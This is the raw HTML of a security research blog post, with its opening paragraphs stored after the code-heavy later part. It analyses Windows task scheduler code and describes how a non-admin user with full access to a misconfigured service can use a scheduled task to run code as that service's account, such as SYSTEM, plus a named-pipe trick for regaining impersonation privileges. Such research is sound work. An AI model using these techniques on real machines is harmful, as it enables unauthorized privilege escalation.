font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;</span><span style=\"background-color: white; color: blue; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">if</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">(</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">principal </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">==</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> caller</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">)</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">{</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"background-color: white; color: blue; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">return</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> TRUE</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">;</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">}</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\"><br /></span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;</span><span style=\"background-color: white; color: blue; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">if</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">(</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">principal</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">.</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">IsServiceSid</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">())</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">{</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;&nbsp;&nbsp;LPCWSTR Name </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">=</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> principal</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">.</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">GetAccount</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">();</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;&nbsp;&nbsp;RpcAutoImpersonate</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">::</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">RpcAutoImpersonate</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">();</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;&nbsp;&nbsp;SC_HANDLE scm </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">=</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> OpenSCManager</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">(</span><span style=\"background-color: white; color: blue; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">NULL</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">,</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: blue; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">NULL</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">,</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> SC_MANAGER_CONNECT</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">);</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;&nbsp;&nbsp;SC_HANDLE service </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">=</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> OpenService</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">(</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">scm</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">,</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> Name</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">,</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> SERVICE_ALL_ACCESS</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">);</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;&nbsp;&nbsp;RpcRevertToSelf</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">();</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"background-color: white; color: blue; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">if</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">(</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">service</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">)</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">{</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"background-color: white; color: blue; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">return</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> TRUE</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">;</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">}</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">}</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;</span><span style=\"background-color: white; color: blue; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">return</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> FALSE</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">;</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">}</span></p><p></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\">The <i>IsPrincipalAllowed </i>function first checks if the caller is an administrator or SYSTEM. If it is then any principal is allowed (again not completely true, but good enough). Next it checks if the principal's user SID matches the one we're setting. This is what would allow NS/LS or a virtual service account to specify a task running as their own user account.&nbsp;</p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><br /></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\">Finally, if the principal is a service SID, then it tries to open the service for full access while impersonating the caller. If that succeeds it allows the service SID to be used as a principal. This behaviour is interesting as it allows for a sneaky way to abuse badly configured services.&nbsp;</p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><br /></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\">It's a well known check for privilege escalation that you enumerate all local services and see if any of them grant a normal user privileged access rights, mainly <i>SERVICE_CHANGE_CONFIG</i>. This is enough to hijack the service and get arbitrary code running as the service account. A common trick is to change the executable path and restart the service, but this isn't great for a few different reasons.</p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"></p><ol style=\"text-align: left;\"><li>Changing the executable path could easily be noticed.</li><li>You probably want to fix the path back again afterwards, which is just a pain.</li><li>If the service is currently running you'll need stop the service, then restart the modified service to get the code execution.</li></ol><div>However, as long as your account is granted full access to the service you can use the task scheduler even without being an administrator to get code running as the service's user account, such as SYSTEM, without ever needing to modify the service's configuration directly or stop/start the service. Much more sneaky. Of course this does mean that the token the task runs under might have privileges stripped etc, but that's something which is easy enough to deal with (as long as it's not write restricted).</div><div><br /></div><div>This is a good lesson on how to never take things on face value. I just assumed the caller would need administrator privileges to set the service account as the principal for a task. But it seems that's not actually required if you dig into the code. Hopefully someone will find it useful.</div><div><br /></div><div><span style=\"color: #eeeeee;\">Footnote: If you read this far, you might also ask, can you get back <i>SeImpersonatePrivilege </i>from a virtual service account or not? Of course, you just use the named pipe trick I described in a <a href=\"https://www.tiraniddo.dev/2020/04/sharing-logon-session-little-too-much.html\">previous blog post</a>. Because of the way that the token is created the token stored in the logon session will still have all the assigned privileges. You can extract the token by using the named pipe to your own service, and use that to create a new process and get back all the missing privileges.</span></div><p></p><div><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\"><br /></span></div><p><br /></p><p><br /></p><p><br /></p><p><br /></p>"}], "summary": "<p>Recently I was playing around with a service which was running under a full virtual service account rather than <i>LOCAL SERVICE</i> or <i>NETWORK SERVICE</i>, but it had <i>SeImpersonatePrivilege</i> removed. Looking for a solution I recalled that <a href=\"https://twitter.com/decoder_it\">Andrea Pierini</a> had <a href=\"https://decoder.cloud/2020/11/05/hands-off-my-service-account/\">posted a blog</a> about using virtual service accounts, so I thought I'd look there for inspiration. One thing which was interesting is that he mentioned that a technique abusing the task scheduler <a href=\"https://itm4n.github.io/localservice-privileges/\">found</a> by&nbsp;<a href=\"https://twitter.com/itm4n\">Cl\u00e9ment Labro</a>, which worked for LS or NS, didn't work when using virtual service accounts. I thought I should investigate it further, out of curiosity, and in the process I found an sneaky technique you can use for other purposes.</p><p>I've already blogged about the task scheduler's use of service accounts. Specifically in a&nbsp;<a href=\"https://www.tiraniddo.dev/2019/09/the-art-of-becoming-trustedinstaller.html\">previous blog post</a>&nbsp;I discussed how you could get the&nbsp;<i>TrustedInstaller&nbsp;</i>group by running a scheduled task using the service SID. As the service SID is the same name as used when you are using a virtual service account it's clear that the problem lies in the way in this functionality is implemented and that it's likely distinct from how LS or NS token's are created.</p><p>The core process creation code for the task scheduler in Windows 10 is actually in the <i>Unified Background Process Manager (UBPM) DLL</i>, rather than in the task scheduler itself. A quick look at that DLL we find the following code:</p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">HANDLE UbpmpTokenGetNonInteractiveToken</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">(</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">PSID PrincipalSid</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">)</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">{</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;</span><span style=\"background-color: white; color: green; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">// ...</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;</span><span style=\"background-color: white; color: blue; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">if</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">(</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">UbpmUtilsIsServiceSid</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">(</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">PrinicpalSid</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">))</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">{</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"background-color: white; color: blue; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">return</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> UbpmpTokenGetServiceAccountToken</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">(</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">PrinicpalSid</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">);</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">}</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;</span><span style=\"background-color: white; color: blue; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">if</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">(</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">EqualSid</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">(</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">PrinicpalSid</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">,</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> kNetworkService</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">))</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">{</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;&nbsp;&nbsp;Domain </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">=</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: grey; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">L\"NT AUTHORITY\"</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">;</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: 